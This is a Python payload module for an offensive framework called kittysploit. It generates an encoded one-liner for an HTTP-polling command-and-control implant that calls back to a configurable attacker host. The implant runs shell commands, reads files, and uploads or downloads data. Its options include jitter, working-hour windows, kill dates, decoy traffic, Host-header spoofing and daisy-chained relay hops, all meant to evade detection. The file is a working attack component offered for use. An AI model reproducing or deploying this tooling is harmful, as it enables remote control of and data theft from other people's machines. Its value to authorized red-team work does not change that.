from kittysploit import *

from lib.c2.beacon_profile import BeaconProfile
from lib.c2.kitty_agent import build_kitty_agent_script


class Module(Payload):
    """Kitty typed-task agent (shell/ls/download/upload over HTTP polling)."""

    CLIENT_LANGUAGE = "python"

    __info__ = {
        "name": "Kitty Agent (typed tasks)",
        "description": (
            "HTTP polling agent with typed tasks: shell, ls, pwd, whoami, cat, "
            "download, upload. Uses the same reverse_http_polling listener as "
            "the classic beacon."
        ),
        "category": PayloadCategory.CMD,
        "arch": Arch.PYTHON,
        "platform": Platform.MULTI,
        "listener": "listeners/multi/reverse_http_polling",
        "handler": Handler.REVERSE,
        "session_type": SessionType.POLLING,
    }

    lhost = OptString("127.0.0.1", "Callback host", True)
    lport = OptPort(8088, "Callback port", True)
    url_prefix = OptString("/c2", "URL prefix (must match listener)", False, True)
    client_id = OptString("", "Client/implant ID", False, True)
    poll_interval = OptInteger(10, "Base poll interval seconds", False, True)
    jitter_percent = OptInteger(35, "Poll jitter percent", False, True)
    kill_date = OptString("", "Kill date ISO YYYY-MM-DD", False, True)
    working_hours = OptString("", "HH:MM-HH:MM window", False, True)
    timezone = OptString("UTC", "Timezone", False, True)
    sleep_outside_hours = OptInteger(3600, "Sleep outside hours", False, True)
    user_agent = OptString("Mozilla/5.0", "HTTP User-Agent", False, True)
    host_header = OptString("", "Optional Host header", False, True)
    payload_comms_host = OptString("", "Optional connect host", False, True)
    chain_token = OptString("", "Daisy-chain token", False, True)
    chain_listen_port = OptInteger(0, "Local hop port (0=off)", False, True)
    chain_listen_host = OptString("0.0.0.0", "Hop bind address", False, True)
    cover_traffic = OptBool(True, "Decoy HTTP requests", False, True)
    use_ssl = OptBool(False, "HTTPS callback", False, True)
    python_binary = OptString("python3", "Python on target", True)

    def generate(self):
        identity = self._apply_implant_identity_options()
        client_id = str(getattr(getattr(self, "client_id", None), "value", self.client_id) or "").strip()
        if identity:
            client_id = identity.implant_id
        elif not client_id:
            client_id = "kitty1"

        profile = BeaconProfile.from_opts(self)
        script = build_kitty_agent_script(
            str(self.lhost),
            int(self.lport),
            client_id,
            url_prefix=str(self.url_prefix or "/c2"),
            use_ssl=bool(self.use_ssl),
            private_key_pem=identity.private_key_pem if identity else None,
            profile=profile,
            chain_token=str(
                getattr(getattr(self, "chain_token", None), "value", self.chain_token) or ""
            ).strip(),
            chain_listen_port=int(
                getattr(getattr(self, "chain_listen_port", None), "value", self.chain_listen_port) or 0
            ),
            chain_listen_host=str(
                getattr(getattr(self, "chain_listen_host", None), "value", self.chain_listen_host)
                or "0.0.0.0"
            ),
        )

        return self._encode_python_one_liner(script, self.python_binary)
